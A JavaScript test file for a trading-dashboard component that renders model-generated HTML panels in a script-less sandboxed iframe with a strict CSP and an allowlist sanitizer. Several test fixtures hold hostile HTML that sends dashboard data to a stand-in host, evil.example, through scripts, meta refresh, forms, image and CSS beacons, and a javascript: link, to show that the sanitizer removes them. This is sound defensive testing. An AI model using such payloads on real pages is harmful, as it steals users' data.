import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import test from 'node:test';
import { renderPanelSafely, sanitizePanelFragment } from '../navrya-src/panelSafeRender.js';
import { DASHBOARD_PANEL_BIND_SCHEMA } from '../navrya-src/dashboardPanelBridgeDoc.js';

// navrya-src/*.jsx has no JSX transform in this runner, so the security properties are asserted
// against the real source text - the same convention tests/analysis-workspace-panel.test.mjs and
// tests/live-session-market-chart.test.mjs already use. This is a deliberately independent React
// COMPONENT module from analysisWorkspacePanelRuntime.jsx (see that file's own header comment on
// why), sharing only the generic, security-critical panelSafeRender.js sanitizer/binder - not
// re-tested in isolation here, see tests/panel-safe-render.test.mjs for its own hostile-input
// suite, exercised directly against real function calls, not source text.
//
// SECURITY REDESIGN (v2): a sandbox="allow-scripts" iframe can always navigate itself to an
// arbitrary URL - the platform's sandboxing model only ever restricts navigating OTHER browsing
// contexts - so a panel that had ever received real data in its own script scope could never be
// proven safe against carrying that data out via a single self-navigation, no matter how the
// bridge TRANSPORT itself was hardened (a prior pass tried a MessageChannel-based transport; it
// closed the "request, then navigate" ordering bug but not the structural one). The fix actually
// applied removes script execution from the render surface entirely: the model's fragment is
// rebuilt from an explicit tag/attribute allowlist (panelSafeRender.js), real data is substituted
// only as escaped text via data-navrya-bind/data-navrya-each, and the iframe itself carries
// `sandbox="allow-same-origin"` with NO allow-scripts - a hard platform guarantee, independent of
// this app's own code, that nothing in the document can execute at all.

const root = process.cwd();
let runtimeSrc;
let runtimeCode; // comments stripped, so a "must never appear" assertion checks the implementation, not its own documentation

test.before(async () => {
  runtimeSrc = await readFile(path.join(root, 'navrya-src', 'dashboardPanelSandbox.jsx'), 'utf8');
  runtimeCode = runtimeSrc.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/^\s*\/\/.*$/gm, ' ');
});

test('a generated dashboard panel renders in an iframe with allow-same-origin only - never allow-scripts, and never same-origin PLUS scripts together', () => {
  const attrs = runtimeCode.match(/sandbox="[^"]*"/g) || [];
  assert.ok(attrs.length, 'no sandbox attribute found at all');
  attrs.forEach((attr) => assert.equal(attr, 'sandbox="allow-same-origin"'));
  assert.doesNotMatch(runtimeCode, /allow-scripts/, 'no allow-scripts token may ever appear in the real implementation, commented out or not');
  assert.doesNotMatch(runtimeCode, /dangerouslySetInnerHTML/);
  assert.doesNotMatch(runtimeCode, /\beval\(/);
  assert.doesNotMatch(runtimeCode, /new Function\(/);
});

test('there is no scriptable bridge left in this file at all - no BRIDGE_CLIENT, no MessageChannel, no postMessage of any kind', () => {
  assert.doesNotMatch(runtimeCode, /BRIDGE_CLIENT/);
  assert.doesNotMatch(runtimeCode, /MessageChannel/);
  assert.doesNotMatch(runtimeCode, /\.postMessage\(/);
  assert.doesNotMatch(runtimeCode, /addEventListener\(\s*['"]message['"]/);
  assert.doesNotMatch(runtimeCode, /navrya\.get/, 'no callable bridge getter API is defined for generated code to call');
});

test('the document this module builds is assembled entirely from panelSafeRender.js\'s sanitizer/binder, never from the raw, unsanitized source string', () => {
  assert.match(runtimeSrc, /import \{ renderPanelSafely, sanitizePanelFragment \} from '\.\/panelSafeRender\.js';/);
  // The function that builds the final wrapper document only ever concatenates an already-built
  // safe body - it must never itself interpolate the raw `source`/`safeBody` PARAMETER coming
  // straight from an untrusted prop without having gone through the imported sanitizer/binder
  // first.
  const panelDoc = /function panelDocument\(safeBody, theme\) \{[\s\S]*?\n\}/.exec(runtimeSrc);
  assert.ok(panelDoc, 'panelDocument(safeBody, theme) not found - the wrapper must be a pure function of an already-safe body');
  assert.doesNotMatch(panelDoc[0], /\bsource\b/, 'the raw, untrusted source must never be visible to the document-wrapper function at all');
});

test('the panel document still carries a strict CSP as defense in depth, including an explicit script-src \'none\' - independent of, not a substitute for, the sandbox attribute having no allow-scripts', () => {
  const csp = /Content-Security-Policy" content="([^"]+)"/.exec(runtimeSrc);
  assert.ok(csp, 'no CSP found in the panel document');
  const policy = csp[1].replace(/\\'/g, "'");
  assert.match(policy, /default-src 'none'/);
  assert.match(policy, /script-src 'none'/);
  assert.doesNotMatch(policy, /connect-src/, 'connect-src must stay unset so it inherits default-src none');
  assert.doesNotMatch(policy, /https?:/);
  assert.doesNotMatch(policy, /unsafe-eval/);
  assert.match(policy, /form-action 'none'/);
  assert.match(policy, /base-uri 'none'/);
});

test('height is measured by the parent reading the iframe\'s own contentDocument directly - no bridge round trip needed for something this safe render surface can read itself', () => {
  assert.match(runtimeSrc, /frame\.contentDocument/);
  assert.match(runtimeSrc, /new ResizeObserver\(measure\)/);
});

test('the bridge root categories are still a short, reviewed, read-only allowlist - the same four this target has always exposed', () => {
  const methods = /export const BRIDGE_METHODS = \[([^\]]+)\]/.exec(runtimeSrc);
  assert.ok(methods, 'BRIDGE_METHODS not found');
  const list = methods[1].split(',').map((s) => s.trim().replace(/'/g, '')).filter(Boolean);
  assert.deepEqual(list, ['tradeSummary', 'openPositions', 'patternStats', 'psychologyMirror']);
  list.forEach((m) => assert.doesNotMatch(m, /^(set|save|add|update|delete|remove|log)/i));
});

test('the snapshot handed to a panel carries dashboard activity facts only - never identity, wallet, or image data', () => {
  const snapshot = /export function buildDashboardBridgeSnapshot\(character\) \{[\s\S]*?\n\}/.exec(runtimeSrc);
  assert.ok(snapshot, 'buildDashboardBridgeSnapshot not found');
  [/email/i, /userId/i, /token/i, /apiKey/i, /wallet/i, /balance/i, /imageBlobId/i, /preview/i].forEach((re) => {
    assert.doesNotMatch(snapshot[0], re, `buildDashboardBridgeSnapshot must not expose ${re}`);
  });
});

test('useDashboardBridgeSnapshot refreshes the snapshot and bumps pulse on the same real store-change events the rest of the Dashboard already reacts to - a mounted panel is not frozen at first mount', () => {
  const hook = /export function useDashboardBridgeSnapshot\(character\) \{[\s\S]*?\n\}/.exec(runtimeSrc);
  assert.ok(hook, 'useDashboardBridgeSnapshot not found');
  ['tradejournal:trades-changed', 'tradejournal:patterns-changed', 'tradejournal:strategy-education-changed'].forEach((eventName) => {
    assert.match(runtimeSrc, new RegExp(eventName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')), `missing refresh wiring for ${eventName}`);
  });
  assert.match(hook[0], /setPulse\(\(p\) => p \+ 1\)/);
  assert.match(hook[0], /snapshotRef\.current = buildDashboardBridgeSnapshot\(character\)/);
});

test('this module never imports from, and is not imported by, analysisWorkspacePanelRuntime.jsx - the two runtime COMPONENTS stay independent (they share only the generic panelSafeRender.js sanitizer)', async () => {
  assert.doesNotMatch(runtimeSrc, /^\s*import .*analysisWorkspacePanelRuntime/m);
  const analysisRuntimeSrc = await readFile(path.join(root, 'navrya-src', 'analysisWorkspacePanelRuntime.jsx'), 'utf8');
  // A real import, not just any mention of the name - both files' header comments legitimately
  // cross-reference each other in prose (they document the same shared security redesign), which
  // is not the same thing as one importing the other's React component.
  assert.doesNotMatch(analysisRuntimeSrc, /^\s*import .*dashboardPanelSandbox/m, 'the two runtime components must remain unaware of each other');
});

// ---------------------------------------------------------------------------------------------
// End-to-end proof against the real pipeline this component actually calls (renderPanelSafely /
// sanitizePanelFragment, imported directly - the same functions the source-text check above
// confirmed the component itself imports and the wrapper function never bypasses) - not a
// source-text guess about what the sanitizer would do. tests/panel-safe-render.test.mjs owns the
// sanitizer's own exhaustive hostile-input suite; these prove this TARGET's real schema + a
// representative snapshot behave correctly end to end.
// ---------------------------------------------------------------------------------------------

const SNAPSHOT = {
  version: 2,
  tradeSummary: { totalTrades: 12, openCount: 4 },
  openPositions: [{ id: 't1', instrument: 'EURUSD', side: 'long', status: 'open', entry: 1.1, stop: 1.09, target: 1.15 }],
  patternStats: [],
  psychologyMirror: null
};

test('a malicious generated panel cannot self-navigate with real dashboard data, by any of the hostile techniques, once rendered through the real dashboard.panel schema', () => {
  const hostile = [
    '<div data-navrya-bind="tradeSummary.totalTrades">?</div>',
    '<script>fetch("/x").then(r=>r.json()).then(d=>location.href="https://evil.example/?d="+JSON.stringify(d))</script>',
    '<script>location.replace("https://evil.example/steal")</script>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example/exfil">',
    '<form action="https://evil.example/collect"><input name="d"></form>',
    '<img src="https://evil.example/beacon.gif?d=leak">',
    '<div style="background:url(https://evil.example/css-beacon.png)">x</div>',
    '<a href="javascript:location.href=\'https://evil.example\'">click</a>'
  ].join('');
  const rendered = renderPanelSafely(hostile, SNAPSHOT, DASHBOARD_PANEL_BIND_SCHEMA);
  assert.doesNotMatch(rendered, /<script/i);
  assert.doesNotMatch(rendered, /<meta/i);
  assert.doesNotMatch(rendered, /<form/i);
  assert.doesNotMatch(rendered, /<a\b/i);
  assert.doesNotMatch(rendered, /evil\.example/);
  assert.doesNotMatch(rendered, /location\.(href|replace)/);
  // The one legitimate part of the same fragment still shows the real value - closing the
  // exfiltration path does not mean the panel shows nothing real.
  assert.match(rendered, /<div data-navrya-bind="tradeSummary\.totalTrades">12<\/div>/);
});

test('a data-navrya-each list panel renders real rows for the real dashboard schema (openPositions)', () => {
  const source = '<ul data-navrya-each="openPositions"><li data-navrya-bind="instrument">?</li></ul>';
  const rendered = renderPanelSafely(source, SNAPSHOT, DASHBOARD_PANEL_BIND_SCHEMA);
  assert.match(rendered, /<li data-navrya-bind="instrument">EURUSD<\/li>/);
});

test('sanitizePanelFragment alone (no snapshot) still strips every hostile construct - used before any revision has been persisted', () => {
  const out = sanitizePanelFragment('<script>location.href="https://evil.example"</script><div>kept</div>');
  assert.doesNotMatch(out, /<script/i);
  assert.doesNotMatch(out, /evil\.example/);
  assert.match(out, /kept/);
});
